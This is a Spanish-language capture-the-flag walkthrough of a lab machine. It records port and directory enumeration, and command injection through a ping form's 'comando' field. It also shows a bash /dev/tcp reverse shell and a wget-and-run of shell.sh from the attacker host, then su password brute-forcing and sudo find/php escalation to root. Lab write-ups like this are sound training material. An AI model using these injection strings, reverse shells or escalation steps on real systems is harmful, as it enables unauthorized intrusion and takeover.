@@ -1,0 +1,285 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+ nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+
+# Fuzzing Web
+
+feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py
+
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      272c http://172.17.0.2/secret
+404      GET        9l       31w      272c http://172.17.0.2/FLAG.txt
+403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      212l      639w     7036c http://172.17.0.2/
+200      GET        3l       23w      123c http://172.17.0.2/info.txt
+200      GET      212l      639w     7036c http://172.17.0.2/index.html
+200      GET       16l       60w      455c http://172.17.0.2/flag.txt
+200      GET       13l       98w      691c http://172.17.0.2/robots.txt
+[####################] - 28s  1245786/1245786 0s      found:7       errors:2      
+[####################] - 27s  1245774/1245774 45670/s http://172.17.0.2/     
+
+
+al chequear http://172.17.0.2/FLAG.txt nos conseguimos con lo siguiente:
+
+____________________________________________________________________
+Alright, you have the 1/4 flag
+This flag is worth 10 points
+You start somewhere, you already have your first flag, keep it up!
+--------------------------------------------------------------------
+
+si revisamos http://172.17.0.2/info.txt nos conseguimos con:
+
+______________________________________________________________________
+Look, I told Eliot to remove those words from the README.txt because 
+it could be a big security flaw in our HTML folder.
+
+traducido:
+Mira, le dije a Eliot que eliminara esas palabras del README.txt 
+porque podría ser una gran falla de seguridad en nuestra carpeta HTML.
+-----------------------------------------------------------------------
+
+y si chequeamos detalladamente en http://172.17.0.2 observamos que 
+existe una animacion que ejecuta comandos y podemos hacer uso de los
+botones <ejecutar comando> y <limpiar salida>
+
+si clickamos en ejecutar comando varias veces, vemos que un caso
+la animacion lee un archivo README.txt, la informacion de ese 
+archivo es:
+__________________________________________________________________
+d05notfound exploit payload shell bruteforce vulnerability cipher 
+zero-day phishing root port_scan firewall backdoor
+------------------------------------------------------------------
+
+y si ahora interpretamos el mensaje en http://172.17.0.2/info.txt
+damos con ese archivo README.txt en la animacion de la web y 
+observamos una frase rara "d05notfound", asi que la chequeamos
+en http://172.17.0.2/d05notfound y accedemos a un panel de control
+
+al final de este panel de control observamos un apartado para la 
+comprobacion de ping y nos solicita una ip para hacerle ping,
+asi que pasamos una ip pero no devuelve nada, asi que capturamos
+una peticion con burpsuite 
+
+peticion capturada:
+_______________________________________________________________________
+POST /d05notfound/d05notfound.php HTTP/1.1
+Host: 172.17.0.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Origin: http://172.17.0.2
+Connection: keep-alive
+Referer: http://172.17.0.2/d05notfound/d05notfound.php
+Cookie: PHPSESSID=g54o9dpoamekd7g2uaeq9oms93
+Upgrade-Insecure-Requests: 1
+
+comando=172.17.0.1
+-----------------------------------------------------------------------
+
+la enviamos al repeter y veo que en la respuesta me devuelve al final del
+todo lo siguiente:
+
+_______________________________________________________________________________
+Resultado del Ping:</h2><pre>PING 172.17.0.1 (172.17.0.1) 56(84) bytes of data.
+64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.099 ms
+64 bytes from 172.17.0.1: icmp_seq=2 ttl=64 time=0.130 ms
+64 bytes from 172.17.0.1: icmp_seq=3 ttl=64 time=0.101 ms
+64 bytes from 172.17.0.1: icmp_seq=4 ttl=64 time=0.142 ms
+
+--- 172.17.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3072ms
+rtt min/avg/max/mdev = 0.099/0.118/0.142/0.018 ms
+</pre>
+-------------------------------------------------------------------------------
+
+por lo que si le enviamos una ip ejecuta un comando para realizar una trasa icmp
+sabiendo esto vamos a modificar la peticion para ver si logramos ejecucion remota
+de comandos, peticion modificada:
+
+>> solo vamos a modificar en comando=172.17.0.1
+
+le vamos a pasar lo siguiente:
+
+comando=172.17.0.1 2>/dev/null | whoami
+
+tras enviar esta peticion, si revisamos, nos devuelve: www-data
+por lo que tenemos ejecucion remota de comandos e intentare enviar
+una reverse shell por lo que me pondre en escucha por netcat
+
+nc -lnvp 4444
+
+y modificamos la peticion para enviar:
+
+comando=172.17.0.1 2>/dev/null | bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+
+
+y no funciono, intente de varias formas pero no tuve resultados, asi que
+levante un server python desde mi maquina atacante para compartir el
+siguiente script .sh:
+
+-----------------------------------------------
+/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+-----------------------------------------------
+
+
+desde burpsuite envia una peticion para descargar el archivo pero no tenia
+permisos en el sirectorio actual, por lo que lo descargamos hacia /tmp
+
+__________________________________________________________________________________
+comando=172.17.0.1 2>/dev/null | wget http://172.17.0.1/shell.sh -O /tmp/shell.sh
+__________________________________________________________________________________
+
+ahora si funciono, por lo que vuelvo enviar un comando mas para ejecutar el script
+
+__________________________________________________________________________________
+comando=172.17.0.1 2>/dev/null | bash /tmp/shell.sh
+__________________________________________________________________________________
+
+me voy a netcat y he conseguido el acceso al sistema
+
+
+# Escalada de Privilegios
+
+script /dev/null -c bash 
+
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+sudo -l					| necesitamos password
+find / -perm -4000 2>/dev/null		| nada por aqui
+
+find / -type f -perm -uo+r 2>/dev/null |grep .txt
+
+/home/e1i0t/documents/agenda.txt
+/home/e1i0t/documents/agenda_passwords.txt
+/home/e1i0t/nota.txt
+
+
+cat /home/e1i0t/nota.txt
+
+Delete my passwords from the agenda, I don't want to screw up with the boss again.
+By e1i0t
+
+
+por lo que vemos la password del otro user esta en alguno de los otros 2 archivos, 
+asi que voy a pasar un script para realizar ataques de diccionario a usuarios del sistema
+
+una vez tengo el script, leere en /etc/passwd para ver los suaurios del sistema
+
+cat /etc/passwd |grep sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+e1i0t:x:1001:1001:e1i0t,,,:/home/e1i0t:/bin/bash
+an0n1mat0:x:1002:1002:an0n1mat0,,,:/home/an0n1mat0:/bin/bash
+
+ok, ahora aplico el ataque contra el user eli0t
+
+./Linux-Su-Force.sh eli0t /home/e1i0t/documents/agenda.txt
+Contraseña encontrada para el usuario e1i0t: eliotelmejor
+
+su e1i0t
+pass:eliotelmejor
+
+-------------------
+somos el user e1i0t
+
+sudo -l
+    (an0n1mat0 : an0n1mat0) NOPASSWD: /bin/find
+
+sudo -u an0n1mat0 /bin/find . -exec /bin/bash \; -quit
+
+-------------------
+somo el user an0n1mat0
+
+si nos vamos al directorio del user actual, vemos 2 archivos:
+
+nota.txt  user2.txt
+
+el archivo user2.txt contiene una flat y el archivo nota.txt:
+___________________________________________________________
+The boss told me that he will soon remove your privileges 
+to be able to access your secret folder.
+___________________________________________________________
+
+existe un directorio que el usuario actual puede acceder y que 
+es de root, asi que vamos a buscarlo
+
+find / -type f -perm -og+r 2>/dev/null |grep .txt
+.
+.
+.
+.
+/secret/confidencial.txt
+
+conseguimos el archivo secreto que contiene:
+______________________________________________________________________
+There is a super secret file that no one but the boss should read, 
+because there are some user passwords.
+You have to move the passwords_users.txt file to a more secure place.
+______________________________________________________________________
+
+existe un archivo llamado: passwords_users.txt
+asi que lo vamos a buscar 
+
+find / -name passwords_users.txt 2>/dev/null
+/usr/local/bin/passwords_users.txt
+
+leemos el archivo y nos conseguimos con esto:
+______________________________________________________________________
+User passwords:
+e1i0t:eliotelmejor
+an0n1mat0:XXyanonymous
+root:root
+There are some outdated passwords, but I don't remember an0n1mat0's 
+entire password, I know that where the two
+______________________________________________________________________
+
+bueno ya tenemos una pista, tenemos que buscar la combinacion correcta
+en los 2 caracteres de la password del user an0n1mat0.
+
+por lo que creo un script en bash que realice esa tarea
+
+script.sh
+---------------------------------------------------------
+#!/bin/bash
+
+# Bucle para generar combinaciones de dos letras
+for i in {a..z}; do
+    for j in {a..z}; do
+        echo "${i}${j}yanonymous"
+    done
+done
+----------------------------------------------------------
+
+ejecutamos el script guardando el resultado en un archivo
+
+./script.sh > wordlist
+
+y como teniamos de antes el script para atacar por diccionario
+a los usuarios del sistema, lo volvemos usar con la nueva wordlist
+que creamos
+
+bash /tmp/Linux-Su-Force.sh an0n1mat0 wordlist
+Contraseña encontrada para el usuario an0n1mat0: soyanonymous
+
+xd, como no lo vi
+
+sudo -l
+pass: soyanonymous
+
+    (ALL : ALL) /bin/php
+
+sudo /bin/php -r "system('/bin/bash');"
+#root
